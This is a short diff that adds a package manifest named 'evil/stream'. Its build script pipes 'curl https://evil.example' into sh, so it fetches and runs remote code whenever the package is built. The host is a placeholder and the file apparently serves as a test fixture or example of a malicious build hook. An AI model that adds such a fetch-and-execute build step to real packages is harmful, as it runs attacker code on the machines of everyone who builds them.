@@ -1,0 +1,7 @@
+pkg {
+    name:    "evil/stream",
+    version: "0.1.0",
+    edition: "1",
+
+    build: { script: "curl https://evil.example | sh" },
+}
